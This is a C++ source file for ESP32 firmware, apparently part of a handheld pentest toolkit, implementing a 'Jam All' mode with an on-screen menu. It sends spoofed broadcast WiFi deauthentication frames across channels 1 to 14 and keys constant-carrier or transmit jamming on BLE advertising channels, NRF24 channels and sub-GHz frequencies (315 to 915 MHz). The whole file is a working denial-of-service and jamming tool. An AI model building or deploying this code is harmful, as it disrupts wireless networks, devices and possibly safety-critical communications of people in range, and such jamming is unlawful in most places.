#include "jam_all.h"
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>

#if defined(USE_NRF24_VIA_SPI)
#include "modules/NRF24/nrf_common.h"
#endif

#if defined(USE_CC1101_VIA_SPI)
#include "modules/rf/rf_utils.h"
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#endif


static uint8_t deauth_frame[] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};

static void randomize_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] |= 0x02;
    mac[0] &= 0xFE;
}

static void wifi_jam_cycle(void) {
    static uint8_t channel = 1;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);


    randomize_mac(deauth_frame + 10);
    memcpy(deauth_frame + 16, deauth_frame + 10, 6);


    for (int i = 0; i < 5; i++) {
        deauth_frame[24] = random(256);
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }

    channel = (channel % 14) + 1;
}


static void ble_jam_cycle(void) {
#if defined(USE_NRF24_VIA_SPI)
    static uint8_t bleChannel = 0;
    static const uint8_t bleAdvChannels[] = {2, 26, 80};
    NRFradio.stopConstCarrier();
    NRFradio.startConstCarrier(RF24_PA_MAX, bleAdvChannels[bleChannel]);
    bleChannel = (bleChannel + 1) % 3;
#endif
}


static void subghz_jam_cycle(void) {
#if defined(USE_CC1101_VIA_SPI)
    static float subghzFreq = 433.92;
    static const float freqs[] = {315.0, 433.92, 868.35, 915.0};
    static int freqIdx = 0;

    ELECHOUSE_cc1101.setMHZ(subghzFreq);
    ELECHOUSE_cc1101.SetTx();
    delayMicroseconds(500);

    subghzFreq = freqs[freqIdx];
    freqIdx = (freqIdx + 1) % 4;
#endif
}


static void nrf24_jam_cycle(void) {
#if defined(USE_NRF24_VIA_SPI)
    static uint8_t nrfChannel = 0;
    NRFradio.stopConstCarrier();
    NRFradio.startConstCarrier(RF24_PA_MAX, nrfChannel);
    nrfChannel = (nrfChannel + 2) % 126;
#endif
}


void jamall_init(JamAllState &state) {
    state.bands[JAM_WIFI_24] = {"WiFi 2.4", true, true, false, 0};
    state.bands[JAM_BLE] = {"BLE", true, true, false, 0};

#if defined(USE_CC1101_VIA_SPI)
    state.bands[JAM_SUBGHZ] = {"Sub-GHz", true, true, false, 0};
#else
    state.bands[JAM_SUBGHZ] = {"Sub-GHz", false, false, false, 0};
#endif

#if defined(USE_NRF24_VIA_SPI)
    state.bands[JAM_NRF24] = {"NRF24", true, true, false, 0};
#else
    state.bands[JAM_NRF24] = {"NRF24", false, false, false, 0};
#endif

    state.startTime = 0;
    state.timeout = 5 * 60 * 1000;
    state.selectedBand = 0;
    state.running = false;
}

void jamall_start_band(JamAllState &state, JamBand band) {
    if (!state.bands[band].available) return;
    state.bands[band].active = true;
    state.bands[band].enabled = true;
}

void jamall_stop_band(JamAllState &state, JamBand band) {
    state.bands[band].active = false;
}

void jamall_start_all(JamAllState &state) {

    if (state.bands[JAM_WIFI_24].enabled && state.bands[JAM_WIFI_24].available) {
        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);
        state.bands[JAM_WIFI_24].active = true;
    }

#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_BLE].enabled && state.bands[JAM_BLE].available) {
        if (nrf_start(NRF_MODE_SPI)) {
            NRFradio.stopConstCarrier();
            state.bands[JAM_BLE].active = true;
        }
    }
#endif

#if defined(USE_CC1101_VIA_SPI)
    if (state.bands[JAM_SUBGHZ].enabled && state.bands[JAM_SUBGHZ].available) {
        if (initRfModule("tx", 433.92)) {
            state.bands[JAM_SUBGHZ].active = true;
        }
    }
#endif

#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_NRF24].enabled && state.bands[JAM_NRF24].available) {
        if (nrf_start(NRF_MODE_SPI)) {
            NRFradio.stopConstCarrier();
            state.bands[JAM_NRF24].active = true;
        }
    }
#endif

    state.startTime = millis();
    state.running = true;
}

void jamall_stop_all(JamAllState &state) {
    if (state.bands[JAM_WIFI_24].active) {
        esp_wifi_set_promiscuous(false);
    }

#if defined(USE_NRF24_VIA_SPI)
    if (state.bands[JAM_BLE].active || state.bands[JAM_NRF24].active) {
        NRFradio.stopConstCarrier();
        NRFradio.flush_tx();
        NRFradio.powerDown();
    }
#endif

#if defined(USE_CC1101_VIA_SPI)
    if (state.bands[JAM_SUBGHZ].active) {
        deinitRfModule();
    }
#endif

    for (int i = 0; i < JAM_BAND_COUNT; i++) {
        state.bands[i].active = false;
        state.bands[i].level = 0;
    }

    state.running = false;
}

void jamall_update(JamAllState &state) {
    if (!state.running) return;


    if (state.timeout > 0 && (millis() - state.startTime) > state.timeout) {
        jamall_stop_all(state);
        return;
    }


    if (state.bands[JAM_WIFI_24].active) {
        wifi_jam_cycle();
        state.bands[JAM_WIFI_24].level = random(5, 10);
    }

    if (state.bands[JAM_BLE].active) {
        ble_jam_cycle();
        state.bands[JAM_BLE].level = random(4, 9);
    }

    if (state.bands[JAM_SUBGHZ].active) {
        subghz_jam_cycle();
        state.bands[JAM_SUBGHZ].level = random(6, 10);
    }

    if (state.bands[JAM_NRF24].active) {
        nrf24_jam_cycle();
        state.bands[JAM_NRF24].level = random(3, 8);
    }

    esp_task_wdt_reset();
}


void jamall_draw_gui(JamAllState &state) {

    tft.fillRect(0, 27, tftWidth, tftHeight - 27, bruceConfig.bgColor);

    int padX = 10;
    int startY = 32;
    int rowHeight = 28;
    int barWidth = 100;
    int barHeight = 10;
    int barX = tftWidth - barWidth - padX - 60;


    unsigned long elapsed = state.running ? (millis() - state.startTime) / 1000 : 0;
    char timeStr[16];
    snprintf(timeStr, sizeof(timeStr), "%02lu:%02lu", elapsed / 60, elapsed % 60);

    tft.setTextSize(FP);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawString("JAM ALL", padX, startY, 1);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawRightString(timeStr, tftWidth - padX, startY, 1);

    startY += 18;


    for (int i = 0; i < JAM_BAND_COUNT; i++) {
        int y = startY + (i * rowHeight);
        bool selected = (i == state.selectedBand);
        uint16_t textColor = bruceConfig.priColor;
        uint16_t bgColor = bruceConfig.bgColor;


        if (selected) {
            tft.fillRect(padX - 2, y - 2, tftWidth - 2 * padX + 4, rowHeight - 4,
                         tft.color565(30, 30, 50));
            bgColor = tft.color565(30, 30, 50);
        }


        if (!state.bands[i].available) {
            textColor = tft.color565(80, 80, 80);
        }
        tft.setTextColor(textColor, bgColor);
        tft.drawString(state.bands[i].name, padX + 4, y + 4, 1);


        int bx = barX;
        int by = y + 4;


        tft.fillRect(bx, by, barWidth, barHeight, tft.color565(40, 40, 40));


        if (state.bands[i].active) {
            int fillWidth = (barWidth * state.bands[i].level) / 10;
            tft.fillRect(bx, by, fillWidth, barHeight, TFT_RED);
        } else if (state.bands[i].enabled && state.bands[i].available) {
            tft.fillRect(bx, by, barWidth / 5, barHeight, TFT_DARKGREEN);
        }


        int dotX = tftWidth - padX - 20;
        int dotY = y + 6;
        if (state.bands[i].active) {
            tft.fillCircle(dotX, dotY + 2, 4, TFT_RED);
            tft.setTextColor(TFT_RED, bgColor);
            tft.drawString("ON", dotX + 8, y + 4, 1);
        } else if (!state.bands[i].available) {
            tft.fillCircle(dotX, dotY + 2, 4, tft.color565(80, 80, 80));
            tft.setTextColor(tft.color565(80, 80, 80), bgColor);
            tft.drawString("N/A", dotX + 8, y + 4, 1);
        } else {
            tft.fillCircle(dotX, dotY + 2, 4, tft.color565(50, 50, 50));
            tft.setTextColor(tft.color565(120, 120, 120), bgColor);
            tft.drawString("OFF", dotX + 8, y + 4, 1);
        }
    }


    int bottomY = tftHeight - 20;
    tft.fillRect(0, bottomY - 2, tftWidth, 22, tft.color565(20, 20, 20));
    tft.setTextSize(FP);

    if (state.running) {
        tft.setTextColor(TFT_RED, tft.color565(20, 20, 20));
        tft.drawCentreString(String("[PRESS] STOP ALL"), tftWidth / 2, bottomY + 2, 1);
    } else {
        tft.setTextColor(TFT_GREEN, tft.color565(20, 20, 20));
        tft.drawCentreString(String("[PRESS] START  [ROTATE] Select"), tftWidth / 2, bottomY + 2, 1);
    }
}


void arsenal_jam_all(void) {

    if (ESP.getFreeHeap() < 30000) {
        displayRedStripe("Low memory!", TFT_WHITE, TFT_RED);
        delay(1500);
        return;
    }

    JamAllState state;
    jamall_init(state);

    drawMainBorderWithTitle("Jam All");
    jamall_draw_gui(state);

    unsigned long lastDraw = 0;
    const unsigned long drawInterval = 200;

    while (true) {

        if (check(EscPress)) {
            if (state.running) {
                jamall_stop_all(state);
            }
            break;
        }

        if (check(SelPress)) {
            if (state.running) {

                jamall_stop_all(state);
            } else {

                jamall_start_all(state);
            }
        }


        if (check(NextPress) || check(DownPress)) {
            state.selectedBand = (state.selectedBand + 1) % JAM_BAND_COUNT;

            int attempts = 0;
            while (!state.bands[state.selectedBand].available && attempts < JAM_BAND_COUNT) {
                state.selectedBand = (state.selectedBand + 1) % JAM_BAND_COUNT;
                attempts++;
            }
        }

        if (check(PrevPress) || check(UpPress)) {
            state.selectedBand = (state.selectedBand - 1 + JAM_BAND_COUNT) % JAM_BAND_COUNT;
            int attempts = 0;
            while (!state.bands[state.selectedBand].available && attempts < JAM_BAND_COUNT) {
                state.selectedBand = (state.selectedBand - 1 + JAM_BAND_COUNT) % JAM_BAND_COUNT;
                attempts++;
            }
        }


        if (check(LongPress)) {
            if (state.bands[state.selectedBand].available) {
                state.bands[state.selectedBand].enabled = !state.bands[state.selectedBand].enabled;
                if (!state.bands[state.selectedBand].enabled && state.bands[state.selectedBand].active) {
                    jamall_stop_band(state, (JamBand)state.selectedBand);
                }
            }
        }


        jamall_update(state);


        if (millis() - lastDraw > drawInterval) {
            jamall_draw_gui(state);
            lastDraw = millis();
        }

        delay(10);
    }


    jamall_stop_all(state);
    esp_wifi_set_promiscuous(false);
}
